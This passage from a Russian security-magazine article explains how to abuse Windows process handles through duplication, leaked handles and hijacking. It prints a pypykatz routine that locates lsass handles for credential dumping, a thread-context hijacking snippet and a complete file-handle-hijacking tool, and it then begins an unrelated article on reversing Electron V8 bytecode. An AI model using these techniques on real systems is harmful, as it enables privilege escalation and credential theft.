                        Пример вывода

Отлично! Код, прав да, не бле щет красотой со всеми этими if. Сеньоры так
не пишут! Поэтому предлагаю соз дать std::map.


...
std::map<ACCESS_MASK, std::wstring> CreateAccessRightsMap(const std::
wstring& handleType) {
  if (handleType == L"Process") {
    return {
      {PROCESS_ALL_ACCESS, L"PROCESS_ALL_ACCESS"},
      {PROCESS_CREATE_PROCESS, L"PROCESS_CREATE_PROCESS"},
      {PROCESS_CREATE_THREAD, L"PROCESS_CREATE_THREAD"},
      {PROCESS_DUP_HANDLE, L"PROCESS_DUP_HANDLE"},
      {PROCESS_QUERY_INFORMATION, L"PROCESS_QUERY_INFORMATION"},
      {PROCESS_QUERY_LIMITED_INFORMATION,
L"PROCESS_QUERY_LIMITED_INFORMATION"},
      {PROCESS_SET_INFORMATION, L"PROCESS_SET_INFORMATION"},
      {PROCESS_SET_QUOTA, L"PROCESS_SET_QUOTA"},
      {PROCESS_SUSPEND_RESUME, L"PROCESS_SUSPEND_RESUME"},
      {PROCESS_TERMINATE, L"PROCESS_TERMINATE"},
      {PROCESS_VM_OPERATION, L"PROCESS_VM_OPERATION"},
      {PROCESS_VM_READ, L"PROCESS_VM_READ"},
      {PROCESS_VM_WRITE, L"PROCESS_VM_WRITE"},
      {SYNCHRONIZE, L"SYNCHRONIZE"}
    };
  }
  else if (handleType == L"Thread") {
    return {
      {THREAD_ALL_ACCESS, L"THREAD_ALL_ACCESS"},
      {THREAD_DIRECT_IMPERSONATION, L"THREAD_DIRECT_IMPERSONATION"},
      {THREAD_GET_CONTEXT, L"THREAD_GET_CONTEXT"},
      {THREAD_IMPERSONATE, L"THREAD_IMPERSONATE"},
      {THREAD_QUERY_INFORMATION, L"THREAD_QUERY_INFORMATION"},
      {THREAD_QUERY_LIMITED_INFORMATION,
L"THREAD_QUERY_LIMITED_INFORMATION"},
      {THREAD_SET_CONTEXT, L"THREAD_SET_CONTEXT"},
      {THREAD_SET_INFORMATION, L"THREAD_SET_INFORMATION"},
      {THREAD_SET_LIMITED_INFORMATION,
L"THREAD_SET_LIMITED_INFORMATION"},
      {THREAD_SET_THREAD_TOKEN, L"THREAD_SET_THREAD_TOKEN"},
      {THREAD_SUSPEND_RESUME, L"THREAD_SUSPEND_RESUME"},
      {THREAD_TERMINATE, L"THREAD_TERMINATE"}
    };
  }
  return {};
}


void ParseAccessMask(HANDLE handle, ACCESS_MASK accessMask) {
  std::wstring handleType = GetHandleType(handle);
  std::wcout << L"Handle Type: " << handleType << std::endl;


  auto accessRightsMap = CreateAccessRightsMap(handleType);


  for (const auto& [mask, name] : accessRightsMap) {
    if ((accessMask & mask) == mask) {
      std::wcout << name << L" ";
    }
  }


  std::wcout << std::endl;
}
...

Те перь мы уме ем по хендлу получать информацию о самом дескрипторе
и извлекать его маску. Оста ется лишь самое малое — получить эти хендлы.
  Нам  не  сос тавит   тру да   это  сделать   с  помощью  функции
NtQuerySystemInformation()        и        передачи          структуры
SYSTEM_HANDLE_INFORMATION.


PSYSTEM_HANDLE_INFORMATION hInfo;


VOID GetHandles() {
    ULONG returnLenght = 0;
    unsigned long long aSize = 0x69;
    hInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(aSize);


    fNtQuerySystemInformation NtQuerySystemInformation = (
fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"),
"NtQuerySystemInformation");
    while (NtQuerySystemInformation(0x10, hInfo, aSize, &returnLenght
) == STATUS_INFO_LENGTH_MISMATCH)
    {
        aSize = returnLenght + 1024;
        hInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(aSize);
    }
}

Те перь получить дос туп  к хендлу возможно через hInfo->Handles[i].
Object. В функцию DuplicateHandle следует передавать hInfo->Handles[
i].HandleValue, так как в Object содер жится адрес, по которому лежит
хендл, а в HandleValue — значение хендла.
   Убе дить ся в том, что все так и есть, можно с помощью Process Hacker.
Под цифрой 1 указано значение Object, а под цифрой 2 — HandleValue.





                  Прос мотр HandleValue и Object

Пос ле успешно го копирования хендла можно делать с ним что угодно (конеч-
но, если это раз решает маска дос тупа)! Например, вот пара идей, которые
могут помочь нам побаловаться:
 • Handle Ripper;
 • MalSecLogon.

В частнос ти, если наш хендл указыва ет на поток и мас ка дос тупа —
THREAD_SET_CONTEXT, то это позволя ет вызывать функцию SetThreadContext().
С ее помощью мы можем применить  к потоку спе циальную структуру
CONTEXT.


typedef struct _WOW64_CONTEXT {
  DWORD                    ContextFlags;
  DWORD                    Dr0;
  DWORD                    Dr1;
  DWORD                    Dr2;
  DWORD                    Dr3;
  DWORD                    Dr6;
  DWORD                    Dr7;
  WOW64_FLOATING_SAVE_AREA FloatSave;
  DWORD                    SegGs;
  DWORD                    SegFs;
  DWORD                    SegEs;
  DWORD                    SegDs;
  DWORD                    Edi;
  DWORD                    Esi;
  DWORD                    Ebx;
  DWORD                    Edx;
  DWORD                    Ecx;
  DWORD                    Eax;
  DWORD                    Ebp;
  DWORD                    Eip;
  DWORD                    SegCs;
  DWORD                    EFlags;
  DWORD                    Esp;
  DWORD                    SegSs;
  BYTE                     ExtendedRegisters[
WOW64_MAXIMUM_SUPPORTED_EXTENSION];
} WOW64_CONTEXT;

Как видишь, эта структура представляет собой набор зна чений регистров
про цесса, которые можно указать и которые будут применены. В час тности,
можно перенаправить  поток  управления целевой  программы, изме нив
регистр Eip или Rip в случае х64.


CONTEXT context;
context.Rip = (DWORD_PTR)remoteBuffer;
SetThreadContext(threadHijacked, &context);

Кста ти, именно этот способ использует pypykatz при попытке сдампить про-
цесс lsass.exe. Ниже — соответствующий учас ток ко да pypykatz.


def enum_lsass_handles():
  #searches for open LSASS process handles in all processes
  # you should be having SE_DEBUG enabled at this point
  RtlAdjustPrivilege(20)


  lsass_handles = []
  sysinfohandles = NtQuerySystemInformation(16)
  for pid in sysinfohandles:
    if pid == 4:
      continue
    #if pid != GetCurrentProcessId():
    #  continue
    for syshandle in sysinfohandles[pid]:
      #print(pid)
      try:
        pHandle = OpenProcess(PROCESS_DUP_HANDLE, False, pid)
      except Exception as e:
        logger.debug('Error opening process %s Reason: %s' % (pid, e)
)
        continue


      try:
        dupHandle = NtDuplicateObject(pHandle, syshandle.Handle,
GetCurrentProcess(), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ)
        #print(dupHandle)
      except Exception as e:
        logger.debug('Failed to duplicate object! PID: %s HANDLE: %s'
% (pid, hex(syshandle.Handle)))
        continue


      oinfo = NtQueryObject(dupHandle, ObjectTypeInformation)
      if oinfo.Name.getString() == 'Process':
        try:
          pname = QueryFullProcessImageNameW(dupHandle)
          if pname.lower().find('lsass.exe') != -1:
            logger.info('Found open handle to lsass! PID: %s HANDLE:
%s' % (pid, hex(syshandle.Handle)))
            #print('%s : %s' % (pid, pname))
            lsass_handles.append((pid, dupHandle))
        except Exception as e:
          logger.debug('Failed to obtain the path of the process!
PID: %s' % pid)
          continue


  return lsass_handles

Целевой  процесс  lsass.exe  здесь  ищет ся  при  помощи  функции
QueryFullProcessImageNameW().  Ей  (в  реализации  pypykatz)  требует ся
передать толь ко ско пированный хендл.


LEAKED HANDLE

Эта атака несколь ко отличается от Handle Duplicating, хотя во многом похожа.
Она основана на том, что при вилегированный про цесс запус кает с откры-
тыми и наследуемыми дес крипторами другой процесс, непривилегирован-
ный, предоставляя ему дос туп к своим дескрипторам.
   Итак, пусть процесс запущен от лица NT AUTHORITY\SYSTEM. У этого про-
цесса есть свои дескрипторы каких-то объектов. Затем этот сис темный про-
цесс дер гает CreateProcess(), указывая bInheritHandles равным TRUE.
Это  приводит   к  тому,  что  процесс,  который  запускается  через
CreateProcess(), во-пер вых, становится дочерним по отношению к сис-
темному  (родительско му)  процессу,  во-вторых,  наследует  все  хендлы
родительского процесса. Например, если родитель ский процесс получил
дес криптор на какой-нибудь другой процесс, а затем соз дал дочерний с нас-
ледованием дескрипторов, то дочерний процесс получит дос туп к этому дес-
крип тору.
  В результате у дочер него процесса с низкими при виле гиями появляется
воз можность исполь зовать хендлы родительского про цесса.
   Как ни странно, но здесь используют ся плюс-минус те же вызовы API.
С помощью NtQuerySystemInformation() перечис ляем хендлы, обнаруживаем
те, которые при надлежат нашему родительскому процес су, после чего
копируем их и эксплуатируем!
  На эту атаку чуть больше PoC’ов, но вооб ще алго ритм такой же, как и
у Handle Duplicating, поэтому можно счи тать Leaked Handle более час тным
слу чаем стандартно го Handle Duplicating. Вот нес коль ко вариантов PoC:
 • ReHacks;
 • ExploitLeakedHandle — моя любимая реализация;
 • LeakedHandlesFinder.

Второй и третий наиболее интересны из-за возможности автоматической
эксплуатации множес тва раз личных хен длов.





                        Пример работы




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





         КАК ЗЛОУПОТРЕБЛЯТЬ ХЕНДЛАМИ
                        В WINDOWS





HANDLE HIJACKING

Эта атака поз воля ет подменить один хендл другим и, например, перенап-
равить поток вывода в другой файл. Фактически мы можем манипулировать
дес крипторами чужих процессов.
   Атака осно вана на том, что Windows повторно использует индексы дес-
крип торов. Когда дескрип тор закрывается, следующий дескриптор, соз-
данный в этом процессе, будет повторно использовать индекс пре дыдущего
дес криптора. Нап ример, закрыли дескриптор с индексом 10, а затем сразу
же соз дали новый. Индекс нового тоже будет равен 10.
   Если рассмат ривать не пас сивную экс плуатацию с перенаправлением
вывода, то можно перенап равить поток ввода. Например, под менить один
файл настро ек другим.
  Общий алгоритм работы следующий:
 1. Получа ем новый хендл, создав новый файл через CreateFile() . Этим
  фай лом и будем подменять.
 2. Приостанав ливаем целевой процесс через NtSuspendProcess() .
 3. Пробегаемся  по  всем  хендлам  в  целевом  процес се  с помощью
  NtQuerySystemInformation() .
 4. Иг норируем все хен длы, которые не являются хендлами на фай лы (пос-
   коль ку мы под меняем фай лы). Для проверки сравнива ем значения
  ObjectTypeIndex. Пом нишь, как мы делали в Handle Duplicating? Здесь
   то же самое.
 5. Находим дескриптор целевого файла в удаленном процес се, используя
  NtQueryInformationFile() со значением FileNameInformation() ,
   что бы получить путь к фай лу.
 6. Полученный хендл копируем и закрываем, используя DuplicateHandle(
  ) с флагом DUPLICATE_CLOSE_SOURCE.
 7. Копируем   хендл  обратно   в   ата куемый  процесс   с  помощью
  DuplicateHandle() , что позволя ет занять пустой индекс.
 8. Вос станавливаем работу программы с помощью NtResumeProcess()
   и получаем успешную подмену файла.

Ни же — реали зация, взятая с прекрасного сай та x86matthew.


#include <stdio.h>
#include <windows.h>


#define SystemExtendedHandleInformation 64
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004


#define FileNameInformation 9
#define PROCESS_SUSPEND_RESUME 0x800


struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
  ULONG Object;
  ULONG UniqueProcessId;
  ULONG HandleValue;
  ULONG GrantedAccess;
  USHORT CreatorBackTraceIndex;
  USHORT ObjectTypeIndex;
  ULONG HandleAttributes;
  ULONG Reserved;
};


struct SYSTEM_HANDLE_INFORMATION_EX
{
  ULONG NumberOfHandles;
  ULONG Reserved;
  SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleList[1];
};


struct FILE_NAME_INFORMATION
{
  ULONG FileNameLength;
  WCHAR FileName[1];
};


struct IO_STATUS_BLOCK
{
  union
  {
    DWORD Status;
    PVOID Pointer;
  };
  DWORD *Information;
};


struct GetFileHandlePathThreadParamStruct
{
  HANDLE hFile;
  char szPath[512];
};


DWORD (WINAPI *NtQuerySystemInformation)(DWORD SystemInformationClass
, PVOID SystemInformation, ULONG SystemInformationLength, PULONG
ReturnLength);
DWORD (WINAPI *NtQueryInformationFile)(HANDLE FileHandle, void *
IoStatusBlock, PVOID FileInformation, ULONG Length, DWORD
FileInformationClass);
DWORD (WINAPI *NtSuspendProcess)(HANDLE Process);
DWORD (WINAPI *NtResumeProcess)(HANDLE Process);


SYSTEM_HANDLE_INFORMATION_EX *pGlobal_SystemHandleInfo = NULL;
DWORD dwGlobal_DebugObjectType = 0;


DWORD GetSystemHandleList()
{
  DWORD dwAllocSize = 0;
  DWORD dwStatus = 0;
  DWORD dwLength = 0;
  BYTE *pSystemHandleInfoBuffer = NULL;


  // free previous handle info list (if one exists)
  if(pGlobal_SystemHandleInfo != NULL)
  {
    free(pGlobal_SystemHandleInfo);
  }


  // get system handle list
  dwAllocSize = 0;
  for(;;)
  {
    if(pSystemHandleInfoBuffer != NULL)
    {
      // free previous inadequately sized buffer
      free(pSystemHandleInfoBuffer);
      pSystemHandleInfoBuffer = NULL;
    }


    if(dwAllocSize != 0)
    {
      // allocate new buffer
      pSystemHandleInfoBuffer = (BYTE*)malloc(dwAllocSize);
      if(pSystemHandleInfoBuffer == NULL)
      {
        return 1;
      }
    }


    // get system handle list
    dwStatus = NtQuerySystemInformation(
SystemExtendedHandleInformation, (void*)pSystemHandleInfoBuffer,
dwAllocSize, &dwLength);
    if(dwStatus == 0)
    {
      // success
      break;
    }
    else if(dwStatus == STATUS_INFO_LENGTH_MISMATCH)
    {
      // not enough space — allocate a larger buffer and try again (
also add an extra 1kb to allow for additional handles created
between checks)
      dwAllocSize = (dwLength + 1024);
    }
    else
    {
      // other error
      free(pSystemHandleInfoBuffer);
      return 1;
    }
  }


  // store handle info ptr
  pGlobal_SystemHandleInfo = (SYSTEM_HANDLE_INFORMATION_EX*)
pSystemHandleInfoBuffer;


  return 0;
}


DWORD GetFileHandleObjectType(DWORD *pdwFileHandleObjectType)
{
  HANDLE hFile = NULL;
  char szPath[512];
  DWORD dwFound = 0;
  DWORD dwFileHandleObjectType = 0;


  // get the file path of the current exe
  memset(szPath, 0, sizeof(szPath));
  if(GetModuleFileName(NULL, szPath, sizeof(szPath) - 1) == 0)
  {
    return 1;
  }


  // open the current exe
  hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL,
OPEN_EXISTING, 0, NULL);
  if(hFile == INVALID_HANDLE_VALUE)
  {
    return 1;
  }


  // take a snapshot of the system handle list
  if(GetSystemHandleList() != 0)
  {
    return 1;
  }


  // close the temporary file handle
  CloseHandle(hFile);


  // find the temporary file handle in the previous snapshot
  for(DWORD i = 0; i < pGlobal_SystemHandleInfo->NumberOfHandles; i++
)
  {
    // check if the process ID is correct
    if(pGlobal_SystemHandleInfo->HandleList[i].UniqueProcessId ==
GetCurrentProcessId())
    {
      // check if the handle index is correct
      if(pGlobal_SystemHandleInfo->HandleList[i].HandleValue == (
DWORD)hFile)
      {
        // store the file handle object type index
        dwFileHandleObjectType = pGlobal_SystemHandleInfo->HandleList
[i].ObjectTypeIndex;
        dwFound = 1;
        break;
      }
    }
  }


  // ensure the file handle object type was found
  if(dwFound == 0)
  {
    return 1;
  }


  // store object type
  *pdwFileHandleObjectType = dwFileHandleObjectType;


  return 0;
}


DWORD WINAPI GetFileHandlePathThread(LPVOID lpArg)
{
  BYTE bFileInfoBuffer[2048];
  IO_STATUS_BLOCK IoStatusBlock;
  GetFileHandlePathThreadParamStruct *pGetFileHandlePathThreadParam =
NULL;
  FILE_NAME_INFORMATION *pFileNameInfo = NULL;


  // get param
  pGetFileHandlePathThreadParam = (GetFileHandlePathThreadParamStruct
*)lpArg;


  // get file path from handle
  memset((void*)&IoStatusBlock, 0, sizeof(IoStatusBlock));
  memset(bFileInfoBuffer, 0, sizeof(bFileInfoBuffer));
  if(NtQueryInformationFile(pGetFileHandlePathThreadParam->hFile, &
IoStatusBlock, bFileInfoBuffer, sizeof(bFileInfoBuffer),
FileNameInformation) != 0)
  {
    return 1;
  }


  // get FILE_NAME_INFORMATION ptr
  pFileNameInfo = (FILE_NAME_INFORMATION*)bFileInfoBuffer;


  // validate filename length
  if(pFileNameInfo->FileNameLength >= sizeof(
pGetFileHandlePathThreadParam->szPath))
  {
    return 1;
  }


  // convert file path to ansi string
  wcstombs(pGetFileHandlePathThreadParam->szPath, pFileNameInfo->
FileName, sizeof(pGetFileHandlePathThreadParam->szPath) - 1);


  return 0;
}


DWORD ReplaceFileHandle(HANDLE hTargetProcess, HANDLE
hExistingRemoteHandle, HANDLE hReplaceLocalHandle)
{
  HANDLE hClonedFileHandle = NULL;
  HANDLE hRemoteReplacedHandle = NULL;


  // close remote file handle
  if(DuplicateHandle(hTargetProcess, hExistingRemoteHandle,
GetCurrentProcess(), &hClonedFileHandle, 0, 0, DUPLICATE_CLOSE_SOURCE
| DUPLICATE_SAME_ACCESS) == 0)
  {
    return 1;
  }


  // close cloned file handle
  CloseHandle(hClonedFileHandle);


  // duplicate local file handle into remote process
  if(DuplicateHandle(GetCurrentProcess(), hReplaceLocalHandle,
hTargetProcess, &hRemoteReplacedHandle, 0, 0, DUPLICATE_SAME_ACCESS)
== 0)
  {
    return 1;
  }


  // ensure that the new remote handle matches the original value
  if(hRemoteReplacedHandle != hExistingRemoteHandle)
  {
    return 1;
  }


  return 0;
}


DWORD HijackFileHandle(DWORD dwTargetPID, char *pTargetFileName,
HANDLE hReplaceLocalHandle)
{
  HANDLE hProcess = NULL;
  HANDLE hClonedFileHandle = NULL;
  DWORD dwFileHandleObjectType = 0;
  DWORD dwThreadExitCode = 0;
  DWORD dwThreadID = 0;
  HANDLE hThread = NULL;
  GetFileHandlePathThreadParamStruct GetFileHandlePathThreadParam;
  char *pLastSlash = NULL;
  DWORD dwHijackCount = 0;


  // calculate the object type index for file handles on this system
  if(GetFileHandleObjectType(&dwFileHandleObjectType) != 0)
  {
    return 1;
  }


  printf("Opening process: %u...\n", dwTargetPID);


  // open target process
  hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME,
0, dwTargetPID);
  if(hProcess == NULL)
  {
    return 1;
  }


  // suspend target process
  if(NtSuspendProcess(hProcess) != 0)
  {
    CloseHandle(hProcess);


    return 1;
  }


  // get system handle list
  if(GetSystemHandleList() != 0)
  {
    NtResumeProcess(hProcess);
    CloseHandle(hProcess);


    return 1;
  }


  for(DWORD i = 0; i < pGlobal_SystemHandleInfo->NumberOfHandles; i++
)
  {
    // ensure this handle is a file handle object
    if(pGlobal_SystemHandleInfo->HandleList[i].ObjectTypeIndex !=
dwFileHandleObjectType)
    {
      continue;
    }


    // ensure this handle is in the target process
    if(pGlobal_SystemHandleInfo->HandleList[i].UniqueProcessId !=
dwTargetPID)
    {
      continue;
    }


    // clone file handle
    if(DuplicateHandle(hProcess, (HANDLE)pGlobal_SystemHandleInfo->
HandleList[i].HandleValue, GetCurrentProcess(), &hClonedFileHandle, 0
, 0, DUPLICATE_SAME_ACCESS) == 0)
    {
      continue;
    }


    // get the file path of the current handle — do this in a new
thread to prevent deadlocks
    memset((void*)&GetFileHandlePathThreadParam, 0, sizeof(
GetFileHandlePathThreadParam));
    GetFileHandlePathThreadParam.hFile = hClonedFileHandle;
    hThread = CreateThread(NULL, 0, GetFileHandlePathThread, (void*)&
GetFileHandlePathThreadParam, 0, &dwThreadID);
    if(hThread == NULL)
    {
      CloseHandle(hClonedFileHandle);
      continue;
    }


    // wait for thread to finish (1 second time out)
    if(WaitForSingleObject(hThread, 1000) != WAIT_OBJECT_0)
    {
      // time out — kill thread
      TerminateThread(hThread, 1);


      CloseHandle(hThread);
      CloseHandle(hClonedFileHandle);
      continue;
    }


    // close cloned file handle
    CloseHandle(hClonedFileHandle);


    // check exit code of temporary thread
    GetExitCodeThread(hThread, &dwThreadExitCode);
    if(dwThreadExitCode != 0)
    {
      // failed
      CloseHandle(hThread);
      continue;
    }


    // close thread handle
    CloseHandle(hThread);


    // get last slash in path
    pLastSlash = strrchr(GetFileHandlePathThreadParam.szPath, '\');
    if(pLastSlash == NULL)
    {
      continue;
    }


    // check if this is the target filename
    pLastSlash++;
    if(stricmp(pLastSlash, pTargetFileName) != 0)
    {
      continue;
    }


    // found matching filename
    printf("Found remote file handle: "%s" (Handle ID: 0x%X)\n",
GetFileHandlePathThreadParam.szPath, pGlobal_SystemHandleInfo->
HandleList[i].HandleValue);
    dwHijackCount++;


    // replace the remote file handle
    if(ReplaceFileHandle(hProcess, (HANDLE)pGlobal_SystemHandleInfo->
HandleList[i].HandleValue, hReplaceLocalHandle) == 0)
    {
      // handle replaced successfully
      printf("Remote file handle hijacked successfully\n\n");
    }
    else
    {
      // failed to hijack handle
      printf("Failed to hijack remote file handle\n\n");
    }
  }


  // resume process
  if(NtResumeProcess(hProcess) != 0)
  {
    CloseHandle(hProcess);


    return 1;
  }


  // clean up
  CloseHandle(hProcess);


  // ensure at least one matching file handle was found
  if(dwHijackCount == 0)
  {
    printf("No matching file handles found\n");


    return 1;
  }


  return 0;
}


DWORD GetNtdllFunctions()
{
  // get NtQueryInformationFile ptr
  NtQueryInformationFile = (unsigned long (__stdcall *)(void *,void *
,void *,unsigned long,unsigned long))GetProcAddress(GetModuleHandle(
"ntdll.dll"), "NtQueryInformationFile");
  if(NtQueryInformationFile == NULL)
  {
    return 1;
  }


  // get NtQuerySystemInformation ptr
  NtQuerySystemInformation = (unsigned long (__stdcall *)(unsigned
long,void *,unsigned long,unsigned long *))GetProcAddress(
GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
  if(NtQuerySystemInformation == NULL)
  {
    return 1;
  }


  // get NtSuspendProcess ptr
  NtSuspendProcess = (unsigned long (__stdcall *)(void *))
GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSuspendProcess");
  if(NtSuspendProcess == NULL)
  {
    return 1;
  }


  // get NtResumeProcess ptr
  NtResumeProcess = (unsigned long (__stdcall *)(void *))
GetProcAddress(GetModuleHandle("ntdll.dll"), "NtResumeProcess");
  if(NtResumeProcess == NULL)
  {
    return 1;
  }


  return 0;
}


int main(int argc, char *argv[])
{
  DWORD dwPID = 0;
  char *pTargetFileName = NULL;
  char *pNewFilePath = NULL;
  HANDLE hFile = NULL;


  printf("HijackFileHandle - www.x86matthew.com\n\n");


  if(argc != 4)
  {
    printf("%s <target_pid> <target_file_name> <new_file_path>\n\n",
argv[0]);
    return 1;
  }


  // get params
  dwPID = atoi(argv[1]);
  pTargetFileName = argv[2];
  pNewFilePath = argv[3];


  // get ntdll function ptrs
  if(GetNtdllFunctions() != 0)
  {
    return 1;
  }


  // create new output file
  hFile = CreateFile(pNewFilePath, GENERIC_READ | GENERIC_WRITE,
FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
  if(hFile == INVALID_HANDLE_VALUE)
  {
    printf("Failed to create file\n");


    return 1;
  }


  // hijack file handle in target process
  if(HijackFileHandle(dwPID, pTargetFileName, hFile) != 0)
  {
    printf("Error\n");


    // error — delete output file
    CloseHandle(hFile);
    DeleteFile(pNewFilePath);


    return 1;
  }


  // close local file handle
  CloseHandle(hFile);


  printf("Finished\n");


  return 0;
}

В данном случае инс трумент требует несколько аргу ментов командной стро-
ки.


HijackFileHandle.exe <target_pid> <target_file_name> <new_file_path>

Здесь указывается PID атакуемо го про цесса и име на файлов. Пер вым идет
файл, который нужно под менить, а вторым — на что под менять.


ÂÛÂÎÄÛ

Бы вает кру то взглянуть на привычные вещи под другим углом! Иногда получе-
ние хендлов необыч ным образом помогает обходить средства защиты. Тот
же MalSecLogon на момент выхода отлично дампил процесс lsass.exe.
ВЗЛОМ





Когда-то компания Positive Technology раз-
работала собственный плагин для деком-
пилятора  Ghidra,  позволяющий  иссле-
довать   веб-при ложения   на    Electron,
в которых исполь зуется скомпилиро ванный           МВК
бинарный код V8 JSC. C тех пор сменилось
мно го вер сий Node.js, фор мат кардинально
поменялся,  в  результате сущес твующие
перестали  работать. В  этой  статье  я
покажу,  как самос тоятельно без деком-
пилятора   отла живать   бинарный   JS-
байт-код про извольной версии.


Сегод ня мы поговорим о приложениях, созданных при помощи сре ды
Electron. Этот фрей мворк — классический пример инстру мента, с помощью
которого любой продвинутый верстальщик может почувствовать себя пол-
ноценным разработчиком кросс-плат форменных программных пакетов. То
есть Electron может сконверти ровать сайт в самодос таточ ное (хотя и нес-
колько неук люжее) при ложение. Надо ли говорить, что технология получила
достаточно широкое распространение. Если верить статье на Хабре, на этой
плат форме реали зовано множес тво популярных при ложе ний — мессендже-
ры Skype и Discord, редакторы для кода Visual Studio Code и Atom и другие.
  Про этот фрей мворк написано множество ста тей (желающие могут изу-
чить, нап ример, руководс тво для начинающих или краткое руководство
по Electron). Однако наш интерес к нему лежит несколько в иной плоскости.
По традиции мы попробу ем препарировать готовое приложение Electron
на предмет иссле дова ния его внут ренней структуры, отладки, реверса, воз-
можной доработ ки и исправления багов.
   Итак, у нас имеется при ложе ние, при открытии исполняемого модуля
которого (надо ска зать, весь ма упи тан ного — больше сотни мегабайт) Detect
It Easy выдает следующую информацию.





Ес ли ты уже слегка знаком с пакетом Electron или успел бегло про читать
предложенные выше статьи, то чудовищный раз мер исполня емого файла
тебя не уди вит — ведь, по сути, исполняемый модуль представляет собой
слег ка оптимизирован ную версию браузера Chromium + Node. В ней запус-
кается код JavaScript, на котором, собс твен но, и написана основная логика
при ложе ния. Этот код и прочие HTML-потроха могут лежать в открытом
и проз рачном для исследова ния виде (этот случай нам неинтересен, как три-
виальный). Также они могут быть собраны или упакованы в отдельный ресурс
спе циального вида asar — тут воз можны сложности, но мы пока не будем их
касаться. Еще ресурсы могут быть частично откомпилиро ваны в натив
в исполняемом файле (обыч но так и есть). А иног да они откомпи лированы
целиком, сей час мы этот вари ант также под робно рассматривать не будем.
Мы начнем с простого случая: ядро Node скомпилировано в натив, а JS-
скрип ты интерпре тируются ядром в виде байт-кода.
  Остановимся поподробнее на этом моменте. Для тех, кто не читал мои
пре дыдущие статьи (например, «Реверсинг .NET. Как искать JIT-компилятор
в приложениях» или «Беззащитная Java. Лома ем Java bytecode encryption»),
поясню, что акту альные скрип товые плат формы (Java, .NET и дру гие) работа-
ют по такому основно му алгоритму. Для удобс тва и скорости скрипт ком-
пилируется в промежу точный кросс-платформенный байт-код, который уже
при работе программы, по мере вызова методов и классов, или интерпре-
тируется интерпре тато ром, или конверти руется в исполняемый нативный код
встро енным JIT-ком пилято ром. Это справедливо и для JavaScript, для которо-
го придумано множество интерпретаторов: V8, SpiderMonkey, Chakra, Rhino,
KJS, Nashorn и другие. Даже в Adobe создали свой собственный движок,
про который я тоже в свое время написал статью.
  Нас же интересует встроенный в Electron дви жок Chrome V8. В нем име-
ется пакет bytenote, поз воляющий сохранить исходный скрипт в виде сери-
ализованного представления байт-кода V8, которое выполняется так же, как и
сам скрипт. Этот формат имеет расширение .JSC и частенько используется
для обфускации как в самом пакете Electron, так и в других сер верных при-
ложениях, написан ных на язы ке JavaScript.
   Упо мянутый  формат  малоизучен:  три  года  назад  груп па  Positive
Technologies озаботилась его реверсом и про вела исследование байт-кода
версии 8.16.0, результатом чего стали нес коль ко статей. Я рекомендую озна-
комиться  с ними самос тоятельно  для пущего понимания пред метной
области.
  Еще  одним  резуль татом  исследования  ста ло  появление  плагина
для декомпилятора  Ghidra, способного  работать с JSC-файлами  вер-
сии 8.16.0. К сожале нию, после это го интерес к теме у иссле дователей угас.
Несмотря на то что с тех пор было выпущено еще несколько проектов
для  ревер са  бинарного  кода  JS  (например,  jsc-decompile-mozjs-34
или cocos2d-jsc-decompiler), вер сии Node.js меняются с такой быстротой, что
на текущий момент все эти про екты без надеж но уста рели. Поэтому я на при-
мере байт-кода вер сии 10.2.154.26 (JSC-сиг натура A905 DEC0 866CEBA8)
попытаюсь рассказать, как самос тоятельно без декомпилято ра исследовать
и отлаживать бинарный JS-байт-код произволь ной вер сии при помощи
отладчика x64dbg и IDA.
  Запустив прог рамму из это го отладчика, мы обна руживаем, что она
не оста навливается ни на одном брейк-пой нте из заботливо размеченных
нами по результатам изучения кода в IDA. Даже на тех, под которы ми по всем
резонам приложе ние должно оста навливаться обя зательно (например, бря ки
на вывод сообщений в консоль). Посмотрев в спи сок активных задач, вспо-
минаем еще одну недоб рую фишку ком пилиро ванных скриптовых языков:
программа для распараллеливания каких-то внутренних процессов запус кает
несколько собственных копий с раз ными парамет рами. Так дела ет и браузер,
уре зан ной вер сией которого наша прог рамма, по сути, и является.
   Как мы вык ручивались из подоб ного зат руднения в прошлые разы? Тупо
аттачились ко всем копиям прог раммы (в при ори тете процес сы с заголовком
активно го окна или Chrome_Widget) и про веряли, какая копия исполняет нуж-
ный нам код, останав ливаясь на бряках. Или же варварски оста навливали код
в нуж ной точке, вби вая туда короткий jmp self (0xEB,0xFE), тем самым
зацикливая программу в данном мес те.





Второй способ подходит нам даже больше, пос коль ку нужное место мгновен-
но прос какивает при заг рузке и руками при тормозить в нем программу мы
никак не успеваем. А так приложение прос то зависает в данной точке,
и заторможенный процесс дос таточ но отследить, при атта чившись к нему
отладчиком, или разбло кировать, вернув исходный код на место и про должив
пос ле это го выполнение процес са.
  Я назвал описанный спо соб вар варским, потому что так делать можно
далеко не всегда. Запущенные процес сы взаимодействуют меж ду собой:
посылают зап росы, получают ответы, и, если ответ не поступает через опре-
деленное вре мя, процесс вполне может совер шить сэппуку по тайм-ауту.
В частнос ти, иссле дуемый нами Electron отсле жива ет тай минг прохождения
про цессов (я так понимаю, не из каких-то параноидальных побуждений,
это обычная фича любого браузера). Но, по счастью, в нашем случае ничего
катастро фического при ложение не делает, ограничиваясь предупрежде-
ниями о подозрительной небезопас ности происходяще го.
   Итак, у нас получилось остановиться в нужном мес те программы. Открыв
стек вызовов, мы обнаружи ваем, что отлаживаемый нами EXE-модуль, нес-
мотря на всю свою раздутость, является весь ма небольшой частью прог-
раммы (откомпи лиро ванным в натив ядром V8), которая вызывается из JIT-
ком пилиро ванного кода.





Ад рес перехо да меж ду интер претатором (выделе но крас ным) и скомпилиро-
ванными в натив биб лиотеками ядра Node (выделено синим) мы видим
на стеке вызовов. Интерпретатор ском пилиро ванного байт-кода выг лядит
при мерно так:


...
